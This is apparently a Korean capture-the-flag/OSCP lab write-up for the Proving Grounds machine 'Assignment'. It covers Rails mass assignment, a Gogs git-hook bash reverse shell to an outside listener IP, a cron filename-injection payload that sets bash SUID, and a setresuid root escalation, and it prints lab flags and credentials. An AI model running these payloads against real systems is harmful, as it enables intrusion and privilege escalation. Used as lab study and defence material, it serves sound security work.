---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/mass-assignment
  - tech/web/idor
  - tech/creds/reuse
  - tech/app/gogs
  - tech/payload/revshell
  - tech/privesc/cron
  - tech/privesc/command-injection
  - tech/privesc/suid
type: machine
platform: pg
os: linux
status: solved
manual_tags: true
manual_cves: true
cves: []
---

# Assignment

> [!info] 요약
> 192.168.248.224 · Ubuntu 20.04.4 · Fundamental · 플래그 2개
> 80(Rails `notes.pg`) 매스어사인먼트로 `role=owner` → 남의 노트 열람 → Gogs 자격증명 → 8000(Gogs 0.12.9) git hook RCE → jane → root 크론 `find ... -exec sh -c 'rm {}'` 파일명 인젝션 → root

## 0. 이 박스에서 배우는 것

- **Rails strong parameters 의 매스어사인먼트** — `permit` 목록에 권한 필드가 섞여 있으면 가입 요청에 한 줄 얹는 것으로 승격
- **인가 검사와 열거 엔드포인트의 분리** — 회원 목록이 사용자 ID 를 그대로 노출하고, 노트 조회는 role 문자열 하나로 갈림
- **Gogs Git Hooks = 설계된 RCE** — admin 이면 서버에서 임의 셸 스크립트를 커밋 시점에 실행시킬 수 있음
- **`find -exec sh -c '... {}'` 파일명 인젝션** — `{}` 가 셸 문자열 안으로 들어가면 파일명이 곧 명령
- **시험 출제 가능성** — 매스어사인먼트와 크론 command injection 둘 다 OSCP 빈출 유형. Gogs/Gitea 계열은 PG·HTB 에 반복 등장하며 hook 이 항상 1순위 벡터

## 1. 정찰

### Nmap

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http
8000/tcp open  http    Golang net/http server
|_http-title: Gogs
```
출처: `~/PG/Assignment/nmap-quick.txt`. `-p-` 전수와 UDP top-100 도 돌렸으나 추가 포트 없음(`nmap-full.txt`, `nmap-udp-top100.txt`).

읽는 법 — 80 은 **버전이 안 뜬다**. nmap 이 `GetRequest` 에 `HTTP/1.0 403 Forbidden` 을 받아 서비스 지문에 실패한 것이고, 실제로는 Rails(puma) 임. `http-title: notes.pg` 만 건짐. **8000 도 `Golang net/http server` 까지만** — Gogs 버전은 배너로 안 나옴.

### 서비스 식별

| 포트 | 실체 | 판정 근거 |
|---|---|---|
| 80 | Rails 앱 `notes.pg` | 응답 쿠키 `_simple_rails_session`, 헤더 `X-Request-Id`·`X-Runtime`, 본문의 `authenticity_token` |
| 8000 | Gogs 0.12.9 | `/admin` 의 Application version 표시 + `/home/jane/gogs/gogs` 빌드시각 `2022-06-07 05:03:46 UTC` |

![[PG-Assignment-gogs-landing.png]]

8000 의 비로그인 랜딩. **버전이 화면 어디에도 없음** — 하단 저작권은 `© 2026 Gogs` 로 연도만. 버전 근거 2개 원칙대로 웹 `/admin` 표시와 바이너리 빌드시각을 교차. 배너만으로는 아무것도 안 나왔음.

`recon.sh` 가 Gogs 응답의 `Set-Cookie ... Domain=assignment.pg` 에서 호스트명 힌트 `assignment.pg` 를 뽑아줬으나 이 박스에서는 vhost 분기가 없어 쓰이지 않음.

### 열거

![[PG-Assignment-landing.png]]

80 의 랜딩. 하단 Contact 에 `jane@notes.pg` — 사용자명 힌트.

gobuster 결과(`gobuster-80.txt`)는 `/login`·`/register`·`/logout`·`/404` 뿐. **의미 있는 것은 로그인 이후에 나옴** — 인증 후 nav 에 `/dashboard`·`/users`·`/create` 가 붙음.

```
$ curl -s http://192.168.248.224/register | grep -oE '<input[^>]*>'
<input type="hidden" name="authenticity_token" value="..." autocomplete="off" />
<input class="form-control" type="text" name="user[username]" id="user_username" />
<input class="form-control" type="password" name="user[password]" id="user_password" />
<input class="form-control" type="password" name="user[password_confirmation]" id="user_password_confirmation" />
```
출처: `~/PG/Assignment/manual/register.html`

![[PG-Assignment-register.png]]

화면에는 입력칸이 셋뿐. **폼에 role 칸이 없는 것이 role 을 못 보낸다는 뜻은 아님** — 이 박스의 전제가 그것임.

가입 파라미터가 `user[...]` 중첩 해시 — Rails 의 strong parameters 가 걸려 있다는 신호. 여기서 물어볼 것은 하나임: **`permit` 목록에 뭐가 더 들어 있나.**

## 2. 취약점 분석

### 2-1. 매스어사인먼트 (Rails strong parameters)

배경 — Rails 는 `params.require(:user).permit(...)` 로 허용 필드를 화이트리스트함. 폼에 없는 필드도 **`permit` 목록에만 있으면 요청으로 채울 수 있음.** 폼 HTML 은 화이트리스트가 아님.

이 앱의 실물(root 획득 후 확인):

```ruby
# /var/www/rails-app/app/controllers/applicants_controller.rb
  def user_params
    params.require(:user).permit(:username, :password, :password_confirmation, :role)
  end
```

`:role` 이 열려 있음. 가입 폼에는 role 입력칸이 없지만 POST 에 얹으면 그대로 들어감.

**힌트는 로그인만 하면 보임.** `/users` 가 전 회원을 ID 와 함께 나열하고, `/users/1` 이 role 값을 그대로 보여줌:

```
$ curl -s -b cookie http://192.168.248.224/users/1
  <h3>User: 1</h3>
    <input type="text" class="form-control" value="jane" id="username" disabled>
    <input type="text" class="form-control" value="2022-05-20 16:48:21 UTC" id="created_at" disabled>
    <textarea class="form-control" id="role" disabled>owner</textarea>
```

즉 **써야 할 값(`owner`)을 앱이 알려줌.** 신규 가입 계정은 `member`.

![[PG-Assignment-members-owner.png]]

회원 목록. id 11 에 URL 인코딩된 요청 문자열이 통째로 사용자명으로 박혀 있고 id 13 이 `forged_owner` — **이전 사용자가 같은 공격을 시도한 흔적이 스냅샷에 남은 것** `[가정]`. 근거는 내가 만든 계정이 id 14 부터라는 것뿐이고 누가 언제 만들었는지는 관측 없음. 어쨌든 정답 파라미터명(`user[role]`)을 그대로 노출함.

### 2-2. role 문자열 하나로 갈리는 인가

```ruby
# /var/www/rails-app/app/controllers/notes_controller.rb
  def show
    @note = Note.find(params[:id])
    if current_user.role == "owner" || @note.user.id == current_user.id
      return @note
    end
    redirect_to :dashboard, flash: { error: "Insufficient rights!" }
  end
```

`role == "owner"` 면 **모든 노트**를 봄. 2-1 로 만든 계정이 그대로 통과.

### 2-3. Gogs Git Hooks

Gogs 관리자는 저장소 Settings → Git Hooks 에서 `pre-receive`·`update`·`post-receive` 본문을 웹 UI 로 편집 가능. 이 스크립트는 **Gogs 프로세스 사용자 권한으로 서버에서 실행**됨. 여기서는 `RUN_USER = jane`.

취약점이라기보다 **관리자에게 주어진 기능**임. 그래서 「admin 자격증명 확보 = RCE 확보」가 됨 — Gogs/Gitea 를 만나면 이것이 1순위.

트리거는 push 가 아니어도 됨. **웹 에디터로 파일 하나 커밋하면 서버가 내부적으로 receive 를 돌면서 hook 을 실행함.**

## 3. Foothold

### 3-1. owner 계정 만들기

가입 요청에 `user[role]=owner` 한 줄 추가. CSRF 토큰은 `/register` 를 GET 해서 뽑아 씀.

```bash
# ~/PG/Assignment/manual/reg.sh 발췌
TOK=$(curl -s -c "$J" "$T/register" | grep -oP 'name="authenticity_token" value="\K[^"]+' | head -1)
curl -s -b "$J" -c "$J" \
  -d "authenticity_token=$TOK" -d "user[username]=$U" -d "user[password]=Passw0rd!23" \
  -d "user[password_confirmation]=Passw0rd!23" -d "user[role]=owner" "$T/register"
```

`-c`/`-b` 로 쿠키를 물리지 않으면 Rails 가 `authenticity_token` 을 세션과 대조하지 못해 **422** 를 뱉음. 토큰만 복사해서는 안 됨.

후보를 순차로 하나씩 던지지 않고 `owner`·`admin`·`user[admin]=true` 세 개를 한 번에 쏜 뒤 `/users/<id>` 로 결과 role 을 대조함:

| 보낸 것 | 생성된 role |
|---|---|
| `user[role]=owner` | `owner` ✅ |
| `user[role]=admin` | `admin` (통과하지만 인가 분기는 `owner` 만 봄) |
| `user[admin]=true` | `member` (permit 밖이라 무시) |

### 3-2. 노트에서 Gogs 자격증명 회수

```
$ curl -s -b cookie http://192.168.248.224/notes/1
  <h3>Note 1</h3>
    <input type="text" class="form-control" value="jane" id="author" disabled>
    <input type="text" class="form-control" value="API creds" id="title" disabled>
    <textarea class="form-control" disabled>my creds for gogs: jane:svc-dev2022@@@!;P;4SSw0Rd</textarea>
```

![[PG-Assignment-note1-creds.png]]

노트 1~4 만 존재. 2번은 jane 의 TODO, 3·4번은 jim 의 잡담.

⚠️ 비밀번호에 `;`·`@`·`!` 가 들어 있음. 셸에 그대로 넣으면 깨지므로 **작은따옴표로 감싸거나 `--data-urlencode`** 를 쓸 것.

### 3-3. Gogs 로그인 — 승격은 필요 없었음

```bash
curl -s -b $J -c $J --data-urlencode "_csrf=$TOK" \
  --data-urlencode "user_name=jane" --data-urlencode "password=svc-dev2022@@@!;P;4SSw0Rd" \
  http://192.168.248.224:8000/user/login
```

302 → `/`. 홈에 `/admin` 링크가 있음 = **jane 은 이미 Gogs 관리자.** 별도 승격 단계 없음.

![[PG-Assignment-gogs-jane-admin.png]]

### 3-4. post-receive 훅에 리버스셸

리스너부터:
```
ssh kali@10.44.44.128 "tmux new-session -d -s asg-rev443 'nc -lvnp 443; exec bash'"
```

저장소 생성 → 훅 작성 → 커밋 트리거의 3단계 모두 curl 로 처리(`manual/mkrepo2.sh`·`hook.sh`·`commit.sh`).

```bash
# 1) 저장소 생성  ⚠️ 소유자 필드는 uid 가 아니라 user_id (Gogs 0.12.9)
curl -s -b $J -c $J -d "_csrf=$TOK" -d "user_id=1" -d "repo_name=pgtest" \
  -d "readme=Default" -d "auto_init=on" -d "default_branch=master" \
  http://192.168.248.224:8000/repo/create

# 2) post-receive 훅
HOOK='#!/bin/bash
bash -i >& /dev/tcp/192.168.45.207/443 0>&1
'
curl -s -b $J -c $J --data-urlencode "_csrf=$TOK" --data-urlencode "content=$HOOK" \
  http://192.168.248.224:8000/jane/pgtest/settings/hooks/git/post-receive

# 3) 웹 에디터로 파일 커밋 → 훅 실행
curl -s -b $J -c $J --data-urlencode "_csrf=$TOK" --data-urlencode "tree_path=trigger.txt" \
  --data-urlencode "content=hi" --data-urlencode "commit_summary=add trigger" \
  --data-urlencode "commit_choice=direct" \
  http://192.168.248.224:8000/jane/pgtest/_new/master/
```

![[PG-Assignment-gogs-post-receive-hook.png]]

3번 요청은 **응답이 안 돌아옴** — 훅이 리버스셸을 붙든 채라 push 처리가 안 끝남. `timeout 25` 로 끊어도 셸은 살아 있음. 「요청이 멈춰 있다 = 실패」로 읽지 말 것.

리스너:
```
jane@assignment:~/gogs-repositories/jane/pgtest.git$
```

pty 승격:
```
jane@assignment:~/gogs-repositories/jane/pgtest.git$ python3 -c "import pty;pty.spawn(\"/bin/bash\")"
jane@assignment:~$ whoami; id; hostname; hostname -I; date; ls -la /home/jane; echo ---; cat /home/jane/local.txt
jane
uid=1000(jane) gid=1000(jane) groups=1000(jane)
assignment
192.168.248.224
Fri 21 Aug 2026 12:30:44 AM UTC
...
-rw------- 1 jane jane   33 Aug 21 00:02 local.txt
---
fb0d680dcb5aa5c1e7aeed44cb452afc
jane@assignment:~$
```
출처: `~/PG/Assignment/proof_user.txt`

> [!warning] 훅 안에서 `cat local.txt` 하지 말 것
> 훅은 「명령 실행」이지 대화형 셸이 아님. OSCP 규정상 웹 기반 셸로 읽은 플래그는 **0점**. 반드시 리버스셸 pty 를 잡고 원위치에서 읽을 것.

## 4. 권한상승

### 열거로 무엇을 발견했는가

셸 직후 `harvest.sh` 1회(`~/PG/Assignment/harvest_jane.txt`, 1300행).

```
===== SUDO =====
sudo: a password is required
```
SUID·getcap 은 전부 스톡. `/etc/crontab`·`/etc/cron.d`·`/etc/cron.hourly`·`/etc/cron.daily` 도 전부 순정 Ubuntu.

**즉 열거 산출물만으로는 크론 벡터가 안 보임.** root 개인 crontab(`/var/spool/cron/crontabs/root`)은 jane 이 못 읽음.

두 갈래로 찾음.

1. **프로세스 관측** — pspy 를 올리려 했으나 Kali 패키지(`/usr/share/pspy/pspy64`·`pspy64s`) 둘 다 타겟에서 `GLIBC_2.34 not found` 로 죽음. `/proc` 폴러를 직접 짜서 대체(§6)
2. **파일명 검색** — 이쪽이 먼저 맞음

```
$ find / -xdev \( -name '*.sh' -o -name 'clean*' \) -newermt '2022-01-01' \
    -not -path '/usr/share/*' -not -path '/snap/*' \
    -not -path '/var/www/rails-app/node_modules/*' -not -path '/usr/local/rvm/*' -type f 2>/dev/null
...
/usr/bin/clean-tmp.sh
...
```

```
$ ls -la /usr/bin/clean-tmp.sh; cat /usr/bin/clean-tmp.sh
-rwxr-xr-x 1 root root 58 Aug  2  2022 /usr/bin/clean-tmp.sh
#! /bin/bash
find /dev/shm -type f -exec sh -c 'rm {}' \;
```

root 획득 후 확인한 스케줄:
```
root@assignment:/tmp# crontab -l
* * * * * /bin/bash /usr/bin/clean-tmp.sh
```
출처: `~/PG/Assignment/root_crontab.txt`. **매분 실행.**

### 왜 그것이 권한상승이 되는가

`find ... -exec sh -c 'rm {}' \;` 의 `{}` 는 find 가 **문자열 치환**으로 넣음. 치환된 결과가 `sh -c` 의 인자, 즉 **셸 소스코드**가 됨.

`/dev/shm/hello` 라는 파일이면 `sh -c "rm /dev/shm/hello"` — 정상.
파일명에 `;` 를 넣으면 그 자리에서 명령이 끊기고 뒤가 새 명령이 됨.

```
sh -c "rm /dev/shm/a;<임의 명령>;"
```

`-exec rm {} \;`(셸 없음) 였으면 안 통함. **`sh -c` 로 감싼 것이 전부**임.

제약 하나 — 파일명에 `/` 를 못 씀. `chmod u+s /bin/bash` 를 그대로 못 넣음. `$(command -v bash)` 로 우회:

```bash
cd /dev/shm
touch 'a;chmod u+s $(command -v bash);'
```

`/dev/shm` 은 `drwxrwxrwt` 라 jane 이 쓸 수 있음. `rm /dev/shm/a` 는 그런 파일이 없어 실패하지만 무해하고, **트리거 파일 자체는 안 지워져 매분 반복 발화**함(정리 때 반드시 지울 것).

1분 뒤:
```
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

### euid 만으로는 부족하다

`/bin/bash -p` 는 euid=0·ruid=1000 상태. 여기서 `sh script.sh` 를 돌리면 **자식 dash 가 euid 를 ruid 로 되돌려** 권한이 조용히 빠짐. 그래서 실제 uid 까지 0 으로 올림:

```
jane@assignment:/tmp$ /bin/bash -p
bash-5.0# python3 -c "import os;os.setresgid(0,0,0);os.setresuid(0,0,0);os.execl(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104),chr(98)+chr(97)+chr(115)+chr(104))"
root@assignment:/tmp#
```

(`chr()` 조합은 `tmux send-keys` → `ssh` 를 거치며 `/` 와 따옴표가 깨지는 것을 피하려는 것. 대화형 터미널이면 `os.execl("/bin/bash","bash")` 로 충분함.)

### 안 쓴 다른 경로

- **puma(Rails)가 root 로 돎** — `/usr/bin/bash -lc rvm use ruby-2.7.2; bundle exec rails s -b 0 --port 80` 이 uid=0. 앱 디렉터리에 쓸 수 있으면 곧바로 root 지만 `/var/www/rails-app` 은 `www-data:www-data drwxrwxr-x` 이고 jane 은 www-data 그룹이 아님 → **닫힘.** 다만 root 로 도는 웹앱이라 RCE 급 웹 취약점이 하나만 더 있었으면 jane 단계를 건너뛸 수 있었음
- 커널 5.4.0-122 / Ubuntu 20.04.4 — DirtyPipe(5.8+)는 대상 아님. PwnKit 은 **시도하지 않음**(2022-06 이미지라 패치 추정이지만 관측 없음)

## 5. 플래그

| | 경로 | 값 |
|---|---|---|
| user | `/home/jane/local.txt` | `fb0d680dcb5aa5c1e7aeed44cb452afc` |
| root | `/root/proof.txt` | `73cb49cd19e6a8a4227a8544cfc27b4b` |

```
root@assignment:/tmp# whoami; id; hostname; hostname -I; date; ls -la /root; echo ---; cat /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root),1000(jane)
assignment
192.168.248.224
Fri 21 Aug 2026 12:46:17 AM UTC
...
-rw-------  1 root root   33 Aug 21 00:03 proof.txt
---
73cb49cd19e6a8a4227a8544cfc27b4b
root@assignment:/tmp#
```
출처: `~/PG/Assignment/proof_root.txt`

## 6. 막혔던 지점 / 시행착오

### 포털 브리핑이 포트 80 을 통째로 빠뜨렸다

브리핑이 제시한 경로는 「8000 Gogs → 계정 열거 + 파라미터 변조로 admin 승격 → git hooks RCE → jane → root 크론 clean-tmp.sh」. 실제와 두 군데가 어긋남:

- **계정 열거와 파라미터 변조는 Gogs 가 아니라 80 의 Rails 앱에서 일어남.** 브리핑은 80 을 아예 언급하지 않았음
- **Gogs 에서 승격할 일이 없음.** jane 계정이 처음부터 Gogs admin

브리핑만 믿고 8000 만 팠으면 자격증명 출처가 없어 막혔을 것. **공식 힌트를 우선순위로는 쓰되 열거 범위를 좁히는 데 쓰지 말 것** — 전 포트 스캔과 두 웹 포트 전수 프로빙이 그 공백을 메웠음.

### `find` 결과를 `head -20` 으로 잘라 정답을 놓쳤다 (약 10분)

셸 잡은 직후 이미 이걸 돌렸음:
```
find / -name "*clean*" -not -path "/proc/*" -not -path "/sys/*" -not -path "/snap/*" \
  -not -path "/usr/share/*" -not -path "/usr/lib/*" 2>/dev/null | head -20
```
출력 20줄이 전부 `/var/www/rails-app/node_modules/...` 의 `clean.js`·`cleanupAttrs.js` 로 찼고 **`/usr/bin/clean-tmp.sh` 는 21번째 이후에 있었음.** 「없다」고 결론내고 프로세스 관측으로 방향을 틀어 10분을 씀.

교훈 — **`head` 는 노이즈를 줄이는 도구지 결론을 내리는 도구가 아님.** 노이즈 경로(`node_modules`·`rvm`·`linux-headers`)를 `-not -path` 로 **빼고** 전량을 볼 것. 결과가 많으면 파일로 받아 grep 할 것.

### pspy 가 안 돌았다

Kali 의 `/usr/share/pspy/pspy64` 와 `pspy64s` 둘 다:
```
/tmp/.p: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/.p)
```
타겟은 Ubuntu 20.04(glibc 2.31), Kali 패키지는 최신 glibc 로 빌드됨. `pspy64s`(정적판) 도 같은 실패 — 이름과 달리 완전 정적이 아님.

대체품으로 `/proc` 폴러를 직접 짬. 처음엔 `sh` + 본 PID 목록을 **파일에 grep** 하는 방식이었는데 너무 느려 초당 몇 회전밖에 못 돎(짧은 크론 프로세스를 놓칠 수 있음). bash 연관배열로 바꾸니 3초에 1000행 — 이게 실용 하한:

```bash
declare -A seen
while ...; do
  for p in /proc/[0-9]*; do
    pid=${p#/proc/}; [[ -n ${seen[$pid]} ]] && continue; seen[$pid]=1
    cmd=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null); [[ -z $cmd ]] && continue
    uid=$(awk '/^Uid:/{print $2; exit}' "$p/status")
    echo "$(date +%T) uid=$uid pid=$pid :: $cmd"
  done
done
```

### `pkill -f` 가 자기 자신을 죽였다

감시기를 재시작하려고 쳤음:
```
ssh ... jane@target 'sed -i "s/+ 400/+ 1500/" /tmp/.w.sh; pkill -f "sh /tmp/.w.sh"; ...; touch /tmp/marker_a ...'
```
`pkill -f` 는 **명령줄 전체**를 봄. 이 SSH 원격 명령 자체의 cmdline 에 `sh /tmp/.w.sh` 라는 문자열이 들어 있어 **자기 셸이 매칭돼 죽음.** 전체가 exit 1 로 끊기고 뒤따르던 `touch` 는 실행되지 않았음. 처음엔 원격 문제로 오독함.

→ **`pkill -f` 는 PID 로 대체할 것.** `ps -eo pid,args | grep '[.]w.sh'` 로 PID 를 확인하고 `kill <PID>`.
(이 볼트의 광범위 `pkill` 금지 규율과 같은 뿌리 — 패턴 매칭은 자기 자신과 남을 함께 잡음.)

### Gogs 저장소 생성이 조용히 실패했다

`-d "uid=1"` 로 보내니 **HTTP 200** 이 돌아옴. 에러 문구도 없었음. 폼 원문을 다시 읽으니:
```
<input type="hidden" id="user_id" name="user_id" value="1" required>
```
0.12.9 의 필드명은 `user_id`. 고치니 **302 + Location: /jane/pgtest**.

→ **Gogs 폼 POST 는 성공이 302, 실패가 200(폼 재표시)임.** 200 을 성공으로 읽지 말 것. 그리고 필드명은 문서나 기억이 아니라 **그 인스턴스의 폼 HTML** 에서 뽑을 것.

### `app.ini` 의 `ENABLE_GIT_HOOKS = false` 는 함정이었다

```ini
[service]
...
ENABLE_GIT_HOOKS = false
```
값만 보면 훅이 막혀 있음. 그런데 **실제로는 그대로 동작함**(훅으로 셸을 땄음). 섹션 배치가 어긋난 것으로 보임 `[가정]` — 소스로 확인하지 않았으므로 원인 단정은 유보.

→ **설정 파일의 「꺼져 있다」는 표시를 근거로 벡터를 배제하지 말 것.** 한 번 때려보는 비용이 훨씬 쌈.

### SSH 비밀번호 재사용은 실패

`jane` / `svc-dev2022@@@!;P;4SSw0Rd` 로 SSH 시도 → `Permission denied`. **Gogs 계정 비밀번호와 시스템 비밀번호는 별개.** 셸 안정화는 `~/.ssh/authorized_keys` 에 Kali 공개키를 넣는 쪽으로 해결(정리 시 제거).

### 소요

전체 약 30분. 정찰 1분(`recon.sh` 즉시 구간 63초) · 80 매스어사인먼트~자격증명 6분 · Gogs 훅 RCE 3분 · **root 크론 특정 14분**(위 `head -20` 사고와 pspy 실패가 대부분).

## 7. OSCP 시험 관점

1. **가입 폼에 `user[...]` 중첩 파라미터가 보이면 즉시 매스어사인먼트를 의심.** Rails·Laravel 공통. 시도할 필드는 `role`·`admin`·`is_admin`·`user_type`·`group_id`. 후보가 유한하니 **하나씩 말고 배치로 쏘고 결과를 대조**할 것
2. **앱이 정답 값을 알려주는 경우가 많음.** 여기서는 `/users/1` 이 jane 의 role 문자열 `owner` 를 그대로 렌더했음. 권한 필드를 **표시**하는 화면이 곧 **값의 사전**
3. **Gogs/Gitea 에 로그인되면 곧바로 Git Hooks 를 볼 것.** 관리자면 RCE 확정. push 없이 웹 에디터 커밋만으로 발화함
4. **`/etc/crontab`·`/etc/cron.d`·`/etc/cron.*` 가 전부 스톡이면 「크론 없음」이 아니라 「내 권한으로 안 보임」임.** root 개인 crontab 은 `/var/spool/cron/crontabs/root`(모드 `drwx-wx--T root:crontab`)에 있어 **비특권 사용자가 읽을 수 없음.** 도구 결함이 아니라 구조적 한계라 `harvest.sh`·LinPEAS 어느 쪽으로도 안 나옴. 우회는 둘 — **주기적 프로세스 관측**, 또는 **쓰기 가능 경로에서 역추적**(여기서는 `/dev/shm`. `find / -perm -0002 -type d` 로 나오는 디렉터리가 청소 크론의 표적일 확률이 높음)
5. **`find ... -exec sh -c '...{}' \;` 는 파일명 인젝션.** 크론 스크립트를 읽었을 때 `-exec` 뒤에 **셸이 끼어 있는지**만 보면 됨. 셸이 없으면 안 통함. 파일명에 `/` 를 못 쓰는 제약은 `$(command -v <이름>)`·`${IFS}`·`cd` 연쇄로 우회
6. **SUID bash 를 얻었으면 `-p` 로 멈추지 말 것.** `bash -p` 는 euid 만 0. 스크립트를 `sh` 로 감싸는 순간 권한이 빠짐 → `python3 -c 'import os;os.setresuid(0,0,0);os.execl("/bin/bash","bash")'` 로 실제 uid 를 0 으로
7. **수동 대안** — 이 박스는 자동 도구가 필요 없었음. 매스어사인먼트는 curl 한 줄, 훅 주입도 curl 3회. sqlmap 류 금지 도구를 쓸 자리가 없음. pspy 는 **허용**(열거 전용)이지만 안 돌면 위 `/proc` 폴러로 대체 가능
8. **시간 배분** — root 크론을 못 찾고 15분이 지나면 ⓐ `find` 결과를 자르지 않았는지 ⓑ 프로세스 관측을 걸어놨는지 둘을 점검할 것. 크론은 **주기를 기다리는 시간**이 들어가므로 심어두고 다른 벡터를 보는 것이 정석
9. **리버스셸이 안 붙으면** — 여기서는 443 이 한 번에 붙었음. 안 붙으면 80·53 순으로 바꾸고 `tcpdump -i tun0` 로 connect-back SYN 이 실제로 나오는지 확인. Kali 쪽 `address already in use`(TIME_WAIT)를 원격 방화벽으로 오독하지 말 것

## 8. 방어 관점

- `permit` 목록에서 `:role` 제거. 권한 필드는 사용자 입력으로 채우지 말 것
- 인가를 문자열 비교(`role == "owner"`)가 아니라 정책 객체(Pundit/CanCanCan)로. 그리고 `/users/:id` 가 role 을 렌더할 이유가 없음
- 자격증명을 애플리케이션 노트에 평문 보관하지 말 것 — 이 박스의 실제 최초 원인
- Gogs 는 `[security] ENABLE_GIT_HOOKS = false` 를 **올바른 섹션에** 두고, 관리자 계정을 최소화
- 크론 스크립트: `find /dev/shm -type f -delete` 로 충분함. 굳이 exec 를 쓴다면 `-exec rm -- {} +` 처럼 **셸을 끼우지 말 것**
- 웹앱을 root 로 돌리지 말 것 — 여기 puma 가 uid 0 이었음

## 9. 참고 자료

- Rails Security Guide — Mass Assignment / Strong Parameters: <https://guides.rubyonrails.org/security.html#mass-assignment>
- Gogs 문서 — Git Hooks: <https://gogs.io/docs>
- GTFOBins `find`: <https://gtfobins.github.io/gtfobins/find/>
- GTFOBins `bash`(SUID): <https://gtfobins.github.io/gtfobins/bash/>

## 남긴 흔적

정리 증거 원문: `~/PG/Assignment/cleanup.txt` (root 셸에서 실행, 전후 비교 포함)

- `/bin/bash` — `u+s` 부여 후 **원복**. `-rwxr-xr-x`, md5 `23c415748ff840b296d0b93f98649dec` (권한상승 전 실측과 일치)
- `/dev/shm/'a;chmod u+s $(command -v bash);'` — 삭제 확인(`/dev/shm` 비어 있음)
- `/tmp` 업로드물(`.h.sh`·`.h/`·`.p`·`.ps`·`.w*.sh`·`.w*.log`·`.plant.sh`·`.hunt.sh`·`.clean.sh`)과 `/tmp/marker_a`·`/var/tmp/marker_a` — 삭제 확인
- `/home/jane/.ssh/authorized_keys` — 삭제 확인(원래 `.ssh` 는 비어 있었음)
- Gogs 저장소 `jane/pgtest` — 웹 UI 로 삭제(이후 GET 404), `~/gogs-repositories/jane/` 도 빈 상태 확인
- Rails 계정 `probe1`·`mass_owner`·`mass_admin`·`mass_admtrue` — sqlite 에서 삭제 확인. **id 10~13 은 내가 만든 것이 아니라 스냅샷에 있던 것이라 그대로 둠**
- 감시 프로세스 — 종료 확인(`ps` 출력 비어 있음)
- Kali tmux `asg-http`·`rc-Assignment-full`·`rc-Assignment-gb` 종료, :8080 리스너 종료 확인

## 관련 노트

- 크론 기반 권한상승 — [[Astronaut]] · [[Exfiltrated]] · [[Muddy]]
- 「응답이 성공을 뜻하지 않는다」(Gogs 200 = 실패) — [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]]
- 버전 판정은 독립 근거 2개 — [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]]
- [[_STATUS]]
